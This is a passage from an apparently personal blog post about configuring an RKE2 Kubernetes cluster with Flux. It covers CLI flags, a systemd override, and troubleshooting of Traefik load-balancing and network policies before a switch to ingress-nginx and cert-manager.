<span id="cb22-40">   --kube-apiserver-arg value                    (flags) Customized flag for kube-apiserver process</span>
<span id="cb22-41">   --etcd-arg value                              (flags) Customized flag for etcd process</span>
<span id="cb22-42">   --kube-controller-manager-arg value           (flags) Customized flag for kube-controller-manager process</span>
<span id="cb22-43">   --kube-scheduler-arg value                    (flags) Customized flag for kube-scheduler process</span>
<span id="cb22-44">   --kube-cloud-controller-manager-arg value     (flags) Customized flag for kube-cloud-controller-manager process</span>
<span id="cb22-45">   --datastore-endpoint value                    (db) Specify etcd, NATS, MySQL, Postgres, or SQLite (default) data source name [$RKE2_DATASTORE_ENDPOINT]</span>
<span id="cb22-46">   --datastore-cafile value                      (db) TLS Certificate Authority file used to secure datastore backend communication [$RKE2_DATASTORE_CAFILE]</span>
<span id="cb22-47">   --datastore-certfile value                    (db) TLS certification file used to secure datastore backend communication [$RKE2_DATASTORE_CERTFILE]</span>
<span id="cb22-48">   --datastore-keyfile value                     (db) TLS key file used to secure datastore backend communication [$RKE2_DATASTORE_KEYFILE]</span>
<span id="cb22-49">   --etcd-expose-metrics                         (db) Expose etcd metrics to client interface. (default: false)</span>
<span id="cb22-50">   --etcd-disable-snapshots                      (db) Disable automatic etcd snapshots</span>
<span id="cb22-51">   --etcd-snapshot-name value                    (db) Set the base name of etcd snapshots (default: etcd-snapshot-&lt;unix-timestamp&gt;) (default: "etcd-snapshot")</span>
<span id="cb22-52">   --etcd-snapshot-schedule-cron value           (db) Snapshot interval time in cron spec. eg. every 5 hours '0 */5 * * *' (default: "0 */12 * * *")</span>
<span id="cb22-53">   --etcd-snapshot-retention value               (db) Number of snapshots to retain (default: 5)</span>
<span id="cb22-54">   --etcd-snapshot-dir value                     (db) Directory to save db snapshots. (default: ${data-dir}/db/snapshots)</span>
<span id="cb22-55">   --etcd-snapshot-compress                      (db) Compress etcd snapshot</span>
<span id="cb22-56">   --etcd-s3                                     (db) Enable backup to S3</span>
<span id="cb22-57">   --etcd-s3-endpoint value                      (db) S3 endpoint url (default: "s3.amazonaws.com")</span>
<span id="cb22-58">   --etcd-s3-endpoint-ca value                   (db) S3 custom CA cert to connect to S3 endpoint</span>
<span id="cb22-59">   --etcd-s3-skip-ssl-verify                     (db) Disables S3 SSL certificate validation</span>
<span id="cb22-60">   --etcd-s3-access-key value                    (db) S3 access key [$AWS_ACCESS_KEY_ID]</span>
<span id="cb22-61">   --etcd-s3-secret-key value                    (db) S3 secret key [$AWS_SECRET_ACCESS_KEY]</span>
<span id="cb22-62">   --etcd-s3-bucket value                        (db) S3 bucket name</span>
<span id="cb22-63">   --etcd-s3-region value                        (db) S3 region / bucket location (optional) (default: "us-east-1")</span>
<span id="cb22-64">   --etcd-s3-folder value                        (db) S3 folder</span>
<span id="cb22-65">   --etcd-s3-proxy value                         (db) Proxy server to use when connecting to S3, overriding any proxy-releated environment variables</span>
<span id="cb22-66">   --etcd-s3-config-secret value                 (db) Name of secret in the kube-system namespace used to configure S3, if etcd-s3 is enabled and no other etcd-s3 options are set</span>
<span id="cb22-67">   --etcd-s3-insecure                            (db) Disables S3 over HTTPS</span>
<span id="cb22-68">   --etcd-s3-timeout value                       (db) S3 timeout (default: 5m0s)</span>
<span id="cb22-69">   --disable value                               (components) Do not deploy packaged components and delete any deployed components (valid items: rke2-coredns, rke2-metrics-server, rke2-sna</span>
<span id="cb22-70">   --disable-scheduler                           (components) Disable Kubernetes default scheduler</span>
<span id="cb22-71">   --disable-cloud-controller                    (components) Disable rke2 default cloud controller manager</span>
<span id="cb22-72">   --disable-kube-proxy                          (components) Disable running kube-proxy</span>
<span id="cb22-73">   --embedded-registry                           (experimental/components) Enable embedded distributed container registry; requires use of embedded containerd; when enabled agents will als</span>
<span id="cb22-74">   --supervisor-metrics                          (experimental/components) Enable serving rke2 internal metrics on the supervisor port; when enabled agents will also listen on the supervis</span>
<span id="cb22-75">   --node-name value                             (agent/node) Node name [$RKE2_NODE_NAME]</span>
<span id="cb22-76">   --with-node-id                                (agent/node) Append id to node name</span>
<span id="cb22-77">   --node-label value                            (agent/node) Registering and starting kubelet with set of labels</span>
<span id="cb22-78">   --node-taint value                            (agent/node) Registering kubelet with set of taints</span>
<span id="cb22-79">   --image-credential-provider-bin-dir value     (agent/node) The path to the directory where credential provider plugin binaries are located (default: "/var/lib/rancher/credentialprovider</span>
<span id="cb22-80">   --image-credential-provider-config value      (agent/node) The path to the credential provider plugin config file (default: "/var/lib/rancher/credentialprovider/config.yaml")</span>
<span id="cb22-81">   --container-runtime-endpoint value            (agent/runtime) Disable embedded containerd and use the CRI socket at the given path; when used with --docker this sets the docker socket p</span>
<span id="cb22-82">   --default-runtime value                       (agent/runtime) Set the default runtime in containerd</span>
<span id="cb22-83">   --disable-default-registry-endpoint           (agent/containerd) Disables containerd's fallback default registry endpoint when a mirror is configured for that registry</span>
<span id="cb22-84">   --snapshotter value                           (agent/runtime) Override default containerd snapshotter (default: "overlayfs")</span>
<span id="cb22-85">   --private-registry value                      (agent/runtime) Private registry configuration file (default: "/etc/rancher/rke2/registries.yaml")</span>
<span id="cb22-86">   --system-default-registry value               (agent/runtime) Private registry to be used for all system images [$RKE2_SYSTEM_DEFAULT_REGISTRY]</span>
<span id="cb22-87">   --node-ip value, -i value                     (agent/networking) IPv4/IPv6 addresses to advertise for node</span>
<span id="cb22-88">   --node-external-ip value                      (agent/networking) IPv4/IPv6 external IP addresses to advertise for node</span>
<span id="cb22-89">   --resolv-conf value                           (agent/networking) Kubelet resolv.conf file [$RKE2_RESOLV_CONF]</span>
<span id="cb22-90">   --kubelet-arg value                           (agent/flags) Customized flag for kubelet process</span>
<span id="cb22-91">   --kube-proxy-arg value                        (agent/flags) Customized flag for kube-proxy process</span>
<span id="cb22-92">   --protect-kernel-defaults                     (agent/node) Kernel tuning behavior. If set, error if kernel tunables are different than kubelet defaults.</span>
<span id="cb22-93">   --enable-pprof                                (experimental) Enable pprof endpoint on supervisor port</span>
<span id="cb22-94">   --selinux                                     (agent/node) Enable SELinux in containerd [$RKE2_SELINUX]</span>
<span id="cb22-95">   --lb-server-port value                        (agent/node) Local port for supervisor client load-balancer. If the supervisor and apiserver are not colocated an additional port 1 less than this port will also be used for the apiserver client load-balancer. (default: 6444) [$RKE2_LB_SERVER_PORT]</span>
<span id="cb22-96">   --cni value                                   (networking) CNI Plugins to deploy, one of none, calico, canal, cilium, flannel; optionally with multus as the first value to enable the multus meta-plugin (default: canal) [$RKE2_CNI]</span>
<span id="cb22-97">   --ingress-controller value                    (networking) Ingress Controllers to deploy, one of none, ingress-nginx, traefik; the first value will be set as the default ingress class (default: ingress-nginx) [$RKE_INGRESS_CONTROLLER]</span>
<span id="cb22-98">   --enable-servicelb                            (components) Enable rke2 default cloud controller manager's service controller [$RKE2_ENABLE_SERVICELB]</span>
<span id="cb22-99">   --kube-apiserver-image value                  (image) Override image to use for kube-apiserver [$RKE2_KUBE_APISERVER_IMAGE]</span>
<span id="cb22-100">   --kube-controller-manager-image value         (image) Override image to use for kube-controller-manager [$RKE2_KUBE_CONTROLLER_MANAGER_IMAGE]</span>
<span id="cb22-101">   --cloud-controller-manager-image value        (image) Override image to use for cloud-controller-manager [$RKE2_CLOUD_CONTROLLER_MANAGER_IMAGE]</span>
<span id="cb22-102">   --kube-proxy-image value                      (image) Override image to use for kube-proxy [$RKE2_KUBE_PROXY_IMAGE]</span>
<span id="cb22-103">   --kube-scheduler-image value                  (image) Override image to use for kube-scheduler [$RKE2_KUBE_SCHEDULER_IMAGE]</span>
<span id="cb22-104">   --pause-image value                           (image) Override image to use for pause [$RKE2_PAUSE_IMAGE]</span>
<span id="cb22-105">   --runtime-image value                         (image) Override image to use for runtime binaries (containerd, kubectl, crictl, etc) [$RKE2_RUNTIME_IMAGE]</span>
<span id="cb22-106">   --etcd-image value                            (image) Override image to use for etcd [$RKE2_ETCD_IMAGE]</span>
<span id="cb22-107">   --kubelet-path value                          (experimental/agent) Override kubelet binary path [$RKE2_KUBELET_PATH]</span>
<span id="cb22-108">   --cloud-provider-name value                   (cloud provider) Cloud provider name [$RKE2_CLOUD_PROVIDER_NAME]</span>
<span id="cb22-109">   --cloud-provider-config value                 (cloud provider) Cloud provider configuration file path [$RKE2_CLOUD_PROVIDER_CONFIG]</span>
<span id="cb22-110">   --profile value                               (security) Validate system configuration against the selected benchmark (valid items: cis) [$RKE2_CIS_PROFILE]</span>
<span id="cb22-111">   --audit-policy-file value                     (security) Path to the file that defines the audit policy configuration [$RKE2_AUDIT_POLICY_FILE]</span>
<span id="cb22-112">   --pod-security-admission-config-file value    (security) Path to the file that defines Pod Security Admission configuration [$RKE2_POD_SECURITY_ADMISSION_CONFIG_FILE]</span>
<span id="cb22-113">   --control-plane-resource-requests value       (components) Control Plane resource requests [$RKE2_CONTROL_PLANE_RESOURCE_REQUESTS]</span>
<span id="cb22-114">   --control-plane-resource-limits value         (components) Control Plane resource limits [$RKE2_CONTROL_PLANE_RESOURCE_LIMITS]</span>
<span id="cb22-115">   --control-plane-probe-configuration value     (components) Control Plane Probe configuration [$RKE2_CONTROL_PLANE_PROBE_CONFIGURATION]</span>
<span id="cb22-116">   --kube-apiserver-extra-mount value            (components) kube-apiserver extra volume mounts [$RKE2_KUBE_APISERVER_EXTRA_MOUNT]</span>
<span id="cb22-117">   --kube-scheduler-extra-mount value            (components) kube-scheduler extra volume mounts [$RKE2_KUBE_SCHEDULER_EXTRA_MOUNT]</span>
<span id="cb22-118">   --kube-controller-manager-extra-mount value   (components) kube-controller-manager extra volume mounts [$RKE2_KUBE_CONTROLLER_MANAGER_EXTRA_MOUNT]</span>
<span id="cb22-119">   --kube-proxy-extra-mount value                (components) kube-proxy extra volume mounts [$RKE2_KUBE_PROXY_EXTRA_MOUNT]</span>
<span id="cb22-120">   --etcd-extra-mount value                      (components) etcd extra volume mounts [$RKE2_ETCD_EXTRA_MOUNT]</span>
<span id="cb22-121">   --cloud-controller-manager-extra-mount value  (components) cloud-controller-manager extra volume mounts [$RKE2_CLOUD_CONTROLLER_MANAGER_EXTRA_MOUNT]</span>
<span id="cb22-122">   --kube-apiserver-extra-env value              (components) kube-apiserver extra environment variables [$RKE2_KUBE_APISERVER_EXTRA_ENV]</span>
<span id="cb22-123">   --kube-scheduler-extra-env value              (components) kube-scheduler extra environment variables [$RKE2_KUBE_SCHEDULER_EXTRA_ENV]</span>
<span id="cb22-124">   --kube-controller-manager-extra-env value     (components) kube-controller-manager extra environment variables [$RKE2_KUBE_CONTROLLER_MANAGER_EXTRA_ENV]</span>
<span id="cb22-125">   --kube-proxy-extra-env value                  (components) kube-proxy extra environment variables [$RKE2_KUBE_PROXY_EXTRA_ENV]</span>
<span id="cb22-126">   --etcd-extra-env value                        (components) etcd extra environment variables [$RKE2_ETCD_EXTRA_ENV]</span>
<span id="cb22-127">   --cloud-controller-manager-extra-env value    (components) cloud-controller-manager extra environment variables [$RKE2_CLOUD_CONTROLLER_MANAGER_EXTRA_ENV]</span></code></pre></div>
<p>So, it seems that the –servicelb system is enabled in the rke2 command line, rather than in the install script.</p>
<p>So, I used <code>systemctl edit rke2-server.service</code> to create an override file for the systemd service.</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb23-1">### Editing /etc/systemd/system/rke2-server.service.d/override.conf</span>
<span id="cb23-2">### Anything between here and the comment below will become the new contents of the file</span>
<span id="cb23-3"></span>
<span id="cb23-4"></span>
<span id="cb23-5">[Service]</span>
<span id="cb23-6">ExecStart=</span>
<span id="cb23-7">ExecStart=/usr/local/bin/rke2 server --servicelb</span>
<span id="cb23-8"></span>
<span id="cb23-9">### Lines below this comment will be discarded</span>
<span id="cb23-10"></span>
<span id="cb23-11">### /usr/local/lib/systemd/system/rke2-server.service</span>
<span id="cb23-12"># [Unit]</span>
<span id="cb23-13"># Description=Rancher Kubernetes Engine v2 (server)</span>
<span id="cb23-14"># Documentation=https://github.com/rancher/rke2#readme</span>
<span id="cb23-15"># Wants=network-online.target</span>
<span id="cb23-16"># After=network-online.target</span>
<span id="cb23-17"># Conflicts=rke2-agent.service</span>
<span id="cb23-18">#</span>
<span id="cb23-19"># [Install]</span>
<span id="cb23-20"># WantedBy=multi-user.target</span>
<span id="cb23-21">#</span>
<span id="cb23-22"># [Service]</span>
<span id="cb23-23"># Type=notify</span>
<span id="cb23-24"># EnvironmentFile=-/etc/default/%N</span>
<span id="cb23-25"># EnvironmentFile=-/etc/sysconfig/%N</span>
<span id="cb23-26"># EnvironmentFile=-/usr/local/lib</span></code></pre></div>
<p>And after restarting the kubernetes service, and reconciling, traefik deploys successfully!</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb24-1">[moonpie@lizard traefik]$ flux get all</span>
<span id="cb24-2">NAME                            REVISION                SUSPENDED       READY   MESSAGE</span>
<span id="cb24-3">...</span>
<span id="cb24-4">...</span>
<span id="cb24-5"></span>
<span id="cb24-6">NAME                    REVISION        SUSPENDED       READY   MESSAGE</span>
<span id="cb24-7">helmrelease/traefik     31.0.0          False           True    Helm install succeeded for release flux-system/traefik.v1 with chart traefik@31.0.0</span>
<span id="cb24-8"></span>
<span id="cb24-9">...</span>
<span id="cb24-10">...</span></code></pre></div>
<p>Except… not really. The port 80 and 443 are not used when I check <code>sudo ss -tulpn</code>, and if I curl either of those ports, it just times out. A relevant <a href="https://github.com/k3s-io/klipper-lb/issues/6">github issue</a> says that klipper has some problems with canal, and to enable <a href="https://docs.tigera.io/calico/latest/reference/configure-cni-plugins#container-settings">canal ip forwarding</a> in <code>/etc/cni/net.d/10-canal.conflist</code>.</p>
<p>However, despite doing this, and restarting, the ports are not in use, and the service times out if I try to curl my site.</p>
<p>But, traefik seems to be working, because if I use the <code>kubectl port-forward</code> command to port forward traefik to my local machine, I can curl it.</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb25-1">[moonpie@lizard traefik]$ kubectl port-forward -n flux-system pods/traefik-6f6c897d6-vr78w 8000</span>
<span id="cb25-2">Forwarding from 127.0.0.1:8000 -&gt; 8000</span>
<span id="cb25-3">Forwarding from [::1]:8000 -&gt; 8000</span>
<span id="cb25-4">Handling connection for 8000</span>
<span id="cb25-5"></span>
<span id="cb25-6"># In a different terminal</span>
<span id="cb25-7"></span>
<span id="cb25-8">[moonpie@lizard traefik]$ curl localhost:8000</span>
<span id="cb25-9">404 page not found</span></code></pre></div>
<p>But…</p>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb26-1">[moonpie@lizard traefik]$ kubectl describe -n flux-system svc/traefik</span>
<span id="cb26-2">Name:                     traefik</span>
<span id="cb26-3">Namespace:                flux-system</span>
<span id="cb26-4">Labels:                   app.kubernetes.io/instance=traefik-flux-system</span>
<span id="cb26-5">                          app.kubernetes.io/managed-by=Helm</span>
<span id="cb26-6">                          app.kubernetes.io/name=traefik</span>
<span id="cb26-7">                          helm.sh/chart=traefik-31.0.0</span>
<span id="cb26-8">                          helm.toolkit.fluxcd.io/name=traefik</span>
<span id="cb26-9">                          helm.toolkit.fluxcd.io/namespace=flux-system</span>
<span id="cb26-10">Annotations:              meta.helm.sh/release-name: traefik</span>
<span id="cb26-11">                          meta.helm.sh/release-namespace: flux-system</span>
<span id="cb26-12">Selector:                 app.kubernetes.io/instance=traefik-flux-system,app.kubernetes.io/name=traefik</span>
<span id="cb26-13">Type:                     LoadBalancer</span>
<span id="cb26-14">IP Family Policy:         SingleStack</span>
<span id="cb26-15">IP Families:              IPv4</span>
<span id="cb26-16">IP:                       10.43.249.0</span>
<span id="cb26-17">IPs:                      10.43.249.0</span>
<span id="cb26-18">LoadBalancer Ingress:     130.166.90.189</span>
<span id="cb26-19">Port:                     web  80/TCP</span>
<span id="cb26-20">TargetPort:               8000/TCP</span>
<span id="cb26-21">NodePort:                 web  30801/TCP</span>
<span id="cb26-22">Endpoints:                10.42.0.15:8000</span>
<span id="cb26-23">Port:                     websecure  443/TCP</span>
<span id="cb26-24">TargetPort:               websecure/TCP</span>
<span id="cb26-25">NodePort:                 websecure  32357/TCP</span>
<span id="cb26-26">Endpoints:                10.42.0.15:8443</span>
<span id="cb26-27">Session Affinity:         None</span>
<span id="cb26-28">External Traffic Policy:  Cluster</span></code></pre></div>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb27-1">root@thoth:~# curl 10.42.0.15:8000</span>
<span id="cb27-2">404 page not found</span></code></pre></div>
<p>So I’m guessing that this is <em>supposed</em> to be forwarded to port 80 on the host, but it isn’t.</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb28-1">[moonpie@lizard traefik]$ kubectl get events --sort-by='.lastTimestamp' -A</span>
<span id="cb28-2">NAMESPACE     LAST SEEN   TYPE      REASON                    OBJECT                                                         MESSAGE                           </span>
<span id="cb28-3">...</span>
<span id="cb28-4">...</span>
<span id="cb28-5">kube-system   9m43s       Warning   FailedMount               pod/helm-install-rke2-canal-jjmwv                              MountVolume.SetUp failed for volume "content" : object "kube-system"/"chart-content-rke2-canal" not registered</span>
<span id="cb28-6">kube-system   5m39s       Warning   FailedMount               pod/helm-install-rke2-canal-jjmwv                              MountVolume.SetUp failed for volume "values" : object "kube-system"/"chart-values-rke2-canal" not registered</span>
<span id="cb28-7">...</span>
<span id="cb28-8">...</span></code></pre></div>
<p>Although an interesting error, it’s possible that this isn’t <em>the</em> error that is irritating me. According to a <a href="https://github.com/rancher/rke2/issues/6528#issuecomment-2278536875">github issue comment</a>, RKE2 comes wtih “network policies” that can restrict traffic between pods, and that might be the issue.</p>
<p>However, on <a href="https://fluxcd.io/flux/installation/configuration/optional-components/#network-policies">according to the fluxcd documentation on networkpolicies</a>, fluxcd comes with rules that disallow traffic to the flux-system namepsace by default… which is where I was attempting to deploy my software.</p>
<p>So, after I change the configs to deploy traefik to the kubernetes <code>default</code> namespace:</p>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb29-1">[moonpie@lizard traefik]$ curl moonpiedumpl.ing</span>
<span id="cb29-2">404 page not found</span></code></pre></div>
<p>It works!</p>
<p>Now, I need to find a test service to deploy. I deployed <a href="https://fluxcd.io/flux/get-started/#add-podinfo-repository-to-flux">podinfo</a>, because it is a simple web service, used as an example service for fluxcd.</p>
<p>Here was the ingress file that I used to expose it on &lt;podinfo.moonpiedumpl.ing&gt;</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>podinfo-ingress.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb30" data-filename="podinfo-ingress.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb30-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">moonpie@lizard podinfo</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">]</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">$ cat podinfo-ingress.yaml</span></span>
<span id="cb30-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> networking.k8s.io/v1</span></span>
<span id="cb30-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Ingress</span></span>
<span id="cb30-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo</span></span>
<span id="cb30-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">traefik.ingress.kubernetes.io/router.entrypoints</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> web</span></span>
<span id="cb30-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb30-9"></span>
<span id="cb30-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">rules</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">host</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo.moonpiedumpl.ing</span></span>
<span id="cb30-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">http</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">paths</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">path</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> /</span></span>
<span id="cb30-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">pathType</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Exact</span></span>
<span id="cb30-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">backend</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">          </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">service</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> podinfo</span></span>
<span id="cb30-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">port</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb30-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">              </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">number</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">9898</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">          </span></span></code></pre></div>
</div>
<p>Not really simple, and it was a pain to edit because my editor (Kate), set tabs to 4 spaces, rather than two.</p>
<p>Now, how can I add HTTPS/TLS to this? Although <a href="https://doc.traefik.io/traefik/https/acme/#configuration-examples">Traefik documents how to enable acme in the first example</a>, however, the documentation on how to add this to each individual site is unclear.</p>
<p>Based on removing the annotation, and testing, it looks like the annoation isn’t needed. Also, it seems that the <code>kubectl explain ingress --recursive</code> explains the “ingress” kubernetes resource, which is above.</p>
<p>However, it seems that Traefik provides an “IngressRoute” resource, which is what they expect you to use for automatic https setups like what I am trying to do. But… I’m hesitant to rely on that, as “IngressRoute” seems to be traefik specific, rather than Ingress, which is general to kubernetes.</p>
<p>Actually, after doing more research, I’ve decided to switch to <a href="https://kubernetes.github.io/ingress-nginx/">ingress-nginx</a>. Unlike traefik, it seems to have build in support for <a href="https://kubernetes.github.io/ingress-nginx/examples/auth/oauth-external-auth/">external oauth authentication</a>. Although Traefik can do it, it’s not build in, and I would have to use a plugin.</p>
<p>So, this means I’m switching from Traefik to nginx and cert-manager instead.</p>
<section id="nginxcert-manager" class="level3">
<h3 class="anchored" data-anchor-id="nginxcert-manager">Nginx/Cert-Manager</h3>
<p>I followed the <a href="https://cert-manager.io/docs/installation/helm/">official cert-manager installation guide</a>, but converted it into flux configs.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>cert-manager/helmsource.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb31" data-filename="cert-manager/helmsource.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb31-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb31-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> source.toolkit.fluxcd.io/v1</span></span>
<span id="cb31-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb31-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb31-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> cert-manager</span></span>
<span id="cb31-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb31-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb31-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb31-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://charts.jetstack.io</span></span></code></pre></div>
</div>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>cert-manager/helmrelease.yaml</strong></pre>
</div>
